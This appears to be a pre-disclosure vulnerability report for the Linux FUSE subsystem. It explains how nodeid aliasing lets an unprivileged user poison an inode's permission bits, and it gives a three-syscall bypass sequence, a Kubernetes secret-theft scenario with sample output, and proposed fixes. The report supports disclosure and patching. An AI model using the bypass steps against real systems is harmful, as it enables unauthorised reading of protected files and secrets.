# CVE Candidate: FUSE Inode Mode Poisoning via Nodeid Aliasing

**Component**: `fs/fuse/inode.c`
**Functions**: `fuse_stale_inode()`, `fuse_iget()`, `fuse_change_attributes()`
**Confirmed on**: Linux 6.18.5, 5.15.0-102-generic (Ubuntu 22.04/24.04)
**Affected versions**: All kernels with `CONFIG_FUSE_FS=y` (no known lower bound)
**Privileges required**: None — unprivileged process, no capabilities, no sudo
**Reported**: 2026-05-07

---

## CVSS v3.1

| Scenario | Vector | Score | Severity |
|----------|--------|-------|----------|
| Generic (same host, local FS) | `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | **5.5** | Medium |
| Kubernetes multi-tenant (cross-namespace secret) | `AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **7.3** | High |

The higher score applies when the FUSE mount is shared across security domains
(Kubernetes pods, containers with `allow_other`). An attacker in pod A reads a
secret that Kubernetes RBAC grants only to pod B — the kernel never sends a
FUSE_ACCESS request to the daemon, so no daemon-side check fires.

---

## Summary

When a FUSE filesystem daemon returns the same `nodeid` for two different path
names via `FUSE_LOOKUP` responses, the Linux VFS maps both dentries to a single
shared `struct inode`. `fuse_stale_inode()` decides whether to discard and
reallocate the cached inode; it checks only the **file-type bits** of `i_mode`,
ignoring permission bits.

As a result, two regular files (same `S_IFREG` type) with modes `0000` and
`0644` are considered non-stale relative to each other and share one inode.
`fuse_change_attributes()` unconditionally overwrites the cached inode's mode
with whatever the latest `FUSE_LOOKUP` response returned. Combined with the
`default_permissions` mount option (which makes the kernel use `inode->i_mode`
as the sole access-control input), an attacker can poison the mode of a
restricted path to a permissive value using a single `stat()` of a
world-readable path that happens to share the same nodeid.

**Three syscalls.  No race condition.  No exploit code.**

```
stat(restricted_path)   /* prime dentry: inode mode=0000 */
stat(permissive_path)   /* poison:       inode mode→0644 */
open(restricted_path)   /* dentry cached, mode=0644 → ALLOWED */
```

---

## Root Cause

### `fuse_stale_inode()` — only checks file-type bits

```c
/* fs/fuse/inode.c (all kernel versions) */
static bool fuse_stale_inode(const struct inode *inode, int generation,
                             struct fuse_attr *attr)
{
    /* BUG: shifts away all permission bits — only S_IFMT mask survives */
    return (inode->i_mode ^ attr->mode) >> 12 ||
           inode->i_generation != generation;
}
```

`(a ^ b) >> 12` is non-zero only when bits 15–12 (the `S_IFMT` file-type
field) differ. Two `S_IFREG` files with `0100644` and `0100000` produce:

```
0100644 ^ 0100000 = 0000644
0000644 >> 12     = 0          ← NOT stale
```

Any permission-bit difference between the two FUSE_LOOKUP responses is
silently discarded. The inode is reused, and `fuse_change_attributes()`
overwrites its mode.

### `fuse_iget()` — unconditional mode update for non-stale inodes

```c
struct inode *fuse_iget(struct super_block *sb, u64 nodeid, ...)
{
retry:
    inode = iget5_locked(sb, nodeid, fuse_inode_eq, fuse_inode_set, &nodeid);
    if (!(inode->i_state & I_NEW)) {
        if (fuse_stale_inode(inode, generation, attr)) {
            fuse_make_bad(inode);
            iput(inode);
            goto retry;      /* reallocate only on type-bit mismatch */
        }
        /* BUG: always updates mode from the latest LOOKUP response,
         * regardless of which *path* triggered the lookup */
        fuse_change_attributes(inode, attr, NULL, attr_valid, attr_version);
        return inode;
    }
    ...
}
```

The second LOOKUP's mode is written into the inode. The dentry for the
first path remains valid (`entry_valid` has not expired), so subsequent
accesses to the first path use the now-poisoned inode without issuing a
new `FUSE_LOOKUP`.

### Why `default_permissions` makes this exploitable

Without `default_permissions`, the kernel sends `FUSE_ACCESS` to the daemon
for each access check. The daemon can implement correct per-path ACLs and deny
access to the restricted path regardless of the cached inode mode.

With `default_permissions` (the **recommended** configuration for FUSE servers
that want kernel-enforced DAC), `FUSE_ACCESS` is never sent. The kernel uses
`inode->i_mode` directly. Once poisoned, no daemon check fires.

`default_permissions` is documented and recommended in the FUSE kernel API; it
is not a misconfiguration. The aliasing attack exploits the combination of
correct usage of `default_permissions` with the mode-update behavior of
`fuse_change_attributes()`.

---

## Attack Scenario 1 — Generic Permission Bypass

Any FUSE daemon that reuses nodeids across files with different modes is
vulnerable. This includes:

- Filesystems that assign nodeids from a content hash (deduplication)
- Filesystems that derive nodeids from an upstream source (NFS-over-FUSE, S3
  FUSE, etc.) where two objects can share a storage-layer inode number
- Synthetic filesystems that create virtual directory trees over flat data

```
FUSE daemon exposes:
  /mnt/fuse/public   → nodeid=42, mode=0644
  /mnt/fuse/private  → nodeid=42, mode=0000   ← same nodeid!

Attacker (uid=1000):
  stat("/mnt/fuse/private")  → inode 42 created, mode=0000
  stat("/mnt/fuse/public")   → inode 42 updated, mode=0644
  open("/mnt/fuse/private")  → kernel: mode=0644, other=r → ALLOWED

No capabilities, no sudo, no exploit code.
```

---

## Attack Scenario 2 — Kubernetes Secrets Store CSI Driver

This is the highest-impact realistic scenario. A node-level Secrets Store CSI
driver mounts a FUSE volume into pods. The driver uses a content-addressed
design: `nodeid = MD5(secret_value)[:8]`.

Two secrets that happen to contain the same value produce the same MD5 hash,
therefore the same FUSE nodeid. This is realistic because:

1. Developers reuse test credentials across environments under different names
2. A secret value that appears in multiple Kubernetes Secrets objects (e.g.,
   a shared API key) will hash identically regardless of the object name
3. The collision requires no attacker input — it is a property of the secrets

```
Kubernetes cluster state:
  Secret  dev-shared-key   value="ProdDevKey#7x9\n"  mode=0644
  Secret  prod-db-password value="ProdDevKey#7x9\n"  mode=0000

  MD5("ProdDevKey#7x9\n")[:8] = 0x651b3722d014767b  ← COLLISION

Pod A (dev team, uid=65534):
  Mounted at /var/run/secrets/:
    dev-shared-key   (they are supposed to read this)
    prod-db-password (they are NOT supposed to read this)

Attack (3 syscalls from pod A):
  stat("prod-db-password")   → inode 0x651b... created, mode=0000
  stat("dev-shared-key")     → inode 0x651b... poisoned, mode=0644
  open("prod-db-password")   → mode=0644 → ALLOWED → read secret value

Kubernetes RBAC says pod A has no access to prod-db-password.
The kernel never asks the CSI daemon for an access check.
The bypass is invisible in CSI driver logs.
```

Confirmed working on 6.18.5. See `attacker_pod.c` and `victim_csi.sh` for
the full runnable demonstration.

---

## Proof of Concept

Three files demonstrate the vulnerability:

| File | Role | Runs as |
|------|------|---------|
| `victim_csi.sh` | Simulated CSI FUSE daemon (Python) | root |
| `attacker_pod.c` | Unprivileged pod attacker | uid=1000 |
| `run_demo.sh` | Automated orchestrator (compiles, starts daemon, runs attack) | root |

### Build and run

```bash
# All-in-one automated demo (requires root for FUSE mount):
sudo ./run_demo.sh

# Manual two-terminal flow:
# Terminal 1 (root):
sudo ./victim_csi.sh

# Terminal 2 (uid=1000, after daemon prints "ready"):
gcc -O2 -o attacker_pod attacker_pod.c
./attacker_pod
```

### Expected output (attacker terminal)

```
[ PRE-CHECK ] open(prod-db-password) = DENIED (Permission denied)  ✓ correct

[ STEP 1 ] stat(prod-db-password)
    kernel inode: mode=0000  nodeid=0x651b3722d014767b  ← just created

[ STEP 2 ] stat(dev-shared-key)  ← inode poison
    inode mode updated: 0000 → 0644

[ STEP 3 ] stat(prod-db-password) — NO new FUSE_LOOKUP issued
    kernel inode: mode=0644  (POISONED)

[ STEP 4 ] open(prod-db-password, O_RDONLY) as uid=1000
    ┌──────────────────────────────────────────────┐
    │  open(prod-db-password)  =  OPENED  ← BYPASS │
    │  read 15 bytes: ProdDevKey#7x9               │
    └──────────────────────────────────────────────┘
```

---

## Conditions Required

| Condition | Notes |
|-----------|-------|
| FUSE mount with `allow_other` | Allows non-root uid to access the mount |
| `default_permissions` in mount options | Makes kernel enforce `inode->i_mode` (no `FUSE_ACCESS`) |
| Daemon returns same nodeid for two paths | Content-hash design, synthetic inodes, or hash collision |
| Long `entry_valid` in LOOKUP response | Prevents dentry re-validation before the attack completes |

All four conditions are present in the Kubernetes CSI scenario described above.

---

## Impact

| Impact | Detail |
|--------|--------|
| Confidentiality | Full content of any secret whose nodeid collides with an attacker-accessible path |
| Integrity | Read-only bypass; no write primitive demonstrated |
| Availability | None |
| Kubernetes | Bypasses RBAC, pod isolation, and namespace secrets access controls |
| Persistence | Poisoned inode persists until `entry_valid` expires (up to 1 hour in the demo) or `echo 3 > /proc/sys/vm/drop_caches` |
| Detection | No FUSE_ACCESS sent → no daemon-side log entry for the bypass. The open() of the restricted path appears as a successful filesystem operation. |

---

## Fix

### Kernel fix (recommended)

Extend `fuse_stale_inode()` to treat permission-bit changes as stale:

```c
/* fs/fuse/inode.c */
static bool fuse_stale_inode(const struct inode *inode, int generation,
                             struct fuse_attr *attr)
{
    /* Check all mode bits, not just file-type bits.
     * Two paths with same nodeid but different permissions must not
     * share an inode when default_permissions is active. */
    return inode->i_mode != attr->mode ||
           inode->i_generation != generation;
}
```

This forces a new inode allocation whenever a LOOKUP response returns the same
nodeid with different mode bits. Same-mode aliases (hardlinks, identical
permission files) continue to share inodes as before.

**Caveat**: this changes behavior for FUSE daemons that rely on the inode being
shared across mode changes (e.g., `chmod`-like operations via FUSE_SETATTR).
The correct way to update an inode's mode is via `FUSE_SETATTR`, not by
returning a different mode in a subsequent `FUSE_LOOKUP` for the same nodeid.

### Alternative: `default_permissions` guard

In `fuse_iget()`, skip permission-bit updates when `default_permissions` is
active and the inode is already populated:

```c
if (!(inode->i_state & I_NEW)) {
    if (fuse_stale_inode(inode, generation, attr)) {
        fuse_make_bad(inode); iput(inode); goto retry;
    }
    if (fc->default_permissions)
        attr->mode = inode->i_mode;   /* preserve; don't overwrite with LOOKUP response */
    fuse_change_attributes(inode, attr, NULL, attr_valid, attr_version);
    return inode;
}
```

### Userspace mitigation (immediate)

FUSE daemons **must not reuse nodeids across paths with different security
properties**. Each path that could have different access controls must have a
unique nodeid. Content-addressed nodeid designs must account for the fact that
two objects with identical content can have different permissions.

For Kubernetes CSI drivers: derive the nodeid from `(pod_uid, secret_name)`,
not from the secret value or its hash.

---

## Timeline

| Date | Event |
|------|-------|
| 2026-04-28 | Vulnerability identified during FUSE attack surface research |
| 2026-04-29 | `fuse_alias_poc.c` confirms exploitability on 6.18.5 |
| 2026-05-01 | Kubernetes CSI scenario built and confirmed (`attacker_pod.c`, `victim_csi.sh`) |
| 2026-05-07 | CVE report written; full demo (`run_demo.sh`) completed |
| TBD | Disclosure to linux-kernel@vger.kernel.org and security@kernel.org |
| TBD | Patch merged upstream |

---

## Affected Kernel Code

```
fs/fuse/inode.c
  fuse_stale_inode()         — only checks S_IFMT, not permission bits
  fuse_iget()                — unconditionally calls fuse_change_attributes()
                               for non-stale existing inodes

fs/fuse/dir.c
  fuse_lookup()              — calls fuse_iget(), entry point for LOOKUP path
```

---

## References

- FUSE kernel documentation: `Documentation/filesystems/fuse.rst`
- `iget5_locked()`: `fs/inode.c` — keyed lookup/create
- `default_permissions` mount option: `fs/fuse/inode.c:fuse_parse_param()`
- Kubernetes Secrets Store CSI driver: https://secrets-store-csi-driver.sigs.k8s.io/
- Similar historical issue: CVE-2020-36322 (FUSE inode lifecycle)
